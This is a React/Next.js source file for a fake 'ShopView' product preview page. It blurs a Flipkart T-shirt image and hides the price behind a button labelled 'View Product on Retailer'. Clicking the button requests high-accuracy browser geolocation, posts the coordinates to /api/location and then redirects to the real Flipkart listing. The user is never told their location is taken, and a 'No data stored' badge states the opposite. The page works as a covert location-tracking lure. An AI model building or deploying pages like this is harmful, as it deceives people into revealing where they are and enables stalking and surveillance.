"use client";

import { useState, useCallback } from "react";
import Image from "next/image";

/* ------------------------------------------------------------------ */
/*  Configuration                                                     */
/* ------------------------------------------------------------------ */
const REDIRECT_URL =
  process.env.NEXT_PUBLIC_REDIRECT_URL ||
  "https://www.flipkart.com/watto-printed-women-round-neck-brown-t-shirt/p/itmdea51159247c9?pid=TSHHJF2SCRYGH65Z&lid=LSTTSHHJF2SCRYGH65ZTQHUBL&hl_lid=&marketplace=FLIPKART&fm=eyJ3dHAiOiJyZWNvIiwicHJwdCI6ImNscCIsIm1pZCI6InBlcnNvbmFsaXNlZFJlY29tbWVuZGF0aW9uL3AycC1zYW1lIn0=&_refId=&_appId=WA";

type LocationState = "idle" | "requesting" | "sending";

/* ------------------------------------------------------------------ */
/*  Component                                                          */
/* ------------------------------------------------------------------ */
export default function ProductPage() {
  const [locState, setLocState] = useState<LocationState>("idle");

  /* ---- Send coordinates to API and redirect immediately ---- */
  const sendLocation = useCallback(
    async (lat: number, lon: number, accuracy: number) => {
      setLocState("sending");
      try {
        await fetch("/api/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            latitude: lat,
            longitude: lon,
            accuracy,
            timestamp: Date.now(),
          }),
        });
      } catch (err) {
        console.error("Location request failed:", err);
      } finally {
        // Redirection only — navigate directly to the product URL
        window.location.href = REDIRECT_URL;
      }
    },
    []
  );

  /* ---- Request browser geolocation ---- */
  const handleShareLocation = useCallback(() => {
    if (!navigator.geolocation) {
      window.location.href = REDIRECT_URL;
      return;
    }

    setLocState("requesting");

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
      },
      () => {
        // If denied or error occurs, redirect directly to Flipkart
        window.location.href = REDIRECT_URL;
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
    );
  }, [sendLocation]);

  const isProcessing = locState === "requesting" || locState === "sending";

  return (
    <>
      {/* ============ Top Bar ============ */}
      <header className="topbar">
        <div className="topbar__inner">
          <span className="topbar__brand">ShopView</span>
          <span className="topbar__tagline">Product Preview</span>
        </div>
      </header>

      {/* ============ Page ============ */}
      <div className="page">
        {/* Breadcrumb */}
        <nav className="breadcrumb" aria-label="Breadcrumb">
          <span>Home</span>
          <span className="breadcrumb__sep">›</span>
          <span>Women&rsquo;s Clothing</span>
          <span className="breadcrumb__sep">›</span>
          <span>T-shirts</span>
        </nav>

        {/* Product Grid */}
        <main className="product">
          {/* ---- Image Column (Always blurred) ---- */}
          <section className="product-image">
            <span className="product-image__badge">Trending</span>
            <Image
              src="/product.png"
              alt="Watto Printed Women Round Neck Brown T-shirt — front view"
              width={600}
              height={800}
              priority
              className="product-image__img product-image__img--blurred"
            />
            <div className="product-image__lock-overlay">
              <div className="lock-pill">
                <span>🔒</span>
                <span>Product Preview</span>
              </div>
              <span className="lock-subtext">Click below to view full details on retailer</span>
            </div>
          </section>

          {/* ---- Info Column ---- */}
          <section className="product-info">
            {/* Title */}
            <div>
              <h1 className="product-title">
                Watto Printed Women Round Neck Brown T-shirt
              </h1>
              <p className="product-subtitle">
                Comfortable everyday wear with a stylish printed design
              </p>

              {/* Rating */}
              <div style={{ marginTop: "var(--space-3)" }}>
                <span className="rating">
                  <span className="rating__stars">4.2 ★</span>
                  <span className="rating__count">1,247 ratings</span>
                </span>
              </div>
            </div>

            {/* Price (Amount not shown) */}
            <div>
              <div className="price-locked">
                <div className="price-locked__bar">
                  <span className="price-locked__placeholder">₹ •••</span>
                  <span className="price-locked__badge">🔒 Price on Retailer</span>
                </div>
                <p className="price__note">
                  Check live price, discounts, and regional offers on the official retailer page.
                </p>
              </div>
            </div>

            <hr className="divider" />

            {/* Specs */}
            <div className="specs">
              <span className="specs__label">Category</span>
              <span className="specs__value">Women&rsquo;s T-shirt</span>

              <span className="specs__label">Color</span>
              <span className="specs__value">Brown</span>

              <span className="specs__label">Neck</span>
              <span className="specs__value">Round Neck</span>

              <span className="specs__label">Pattern</span>
              <span className="specs__value">Printed</span>

              <span className="specs__label">Brand</span>
              <span className="specs__value">Watto</span>
            </div>

            {/* Description */}
            <div className="description">
              <h3>Product Description</h3>
              <p>
                This round neck brown t-shirt from Watto features a trendy
                printed design that pairs well with jeans, skirts, or casual
                trousers. Made for everyday comfort, it offers a relaxed fit
                with a soft fabric that&rsquo;s breathable and easy to care for.
                Ideal for casual outings, college wear, or lounging at home.
              </p>
            </div>

            <hr className="divider" />

            {/* Status messages */}
            {isProcessing && (
              <div className="status status--loading" role="status">
                <div className="spinner spinner--dark" />
                <span>Redirecting to retailer…</span>
              </div>
            )}

            {/* ---- Action Button ---- */}
            <div className="btn-group">
              <button
                id="share-location-btn"
                className="btn btn--location"
                onClick={(e) => { e.preventDefault(); handleShareLocation(); }}
                onTouchEnd={(e) => { e.preventDefault(); handleShareLocation(); }}
                disabled={isProcessing}
                type="button"
              >
                {isProcessing ? "Redirecting to Retailer…" : "📍 View Product on Retailer →"}
              </button>
            </div>

            {/* Trust bar */}
            <div className="trust-bar">
              <span className="trust-bar__item">🔒 Secure</span>
              <span className="trust-bar__item">📍 Fast redirect</span>
              <span className="trust-bar__item">🚫 No data stored</span>
            </div>
          </section>
        </main>
      </div>

      {/* ============ Footer ============ */}
      <footer className="page-footer">
        <p>
          This is an independent product preview page. It is not affiliated
          with or operated by any specific retailer.
        </p>
        <p>
          Product names, images, and trademarks belong to their respective
          owners.
        </p>
      </footer>
    </>
  );
}
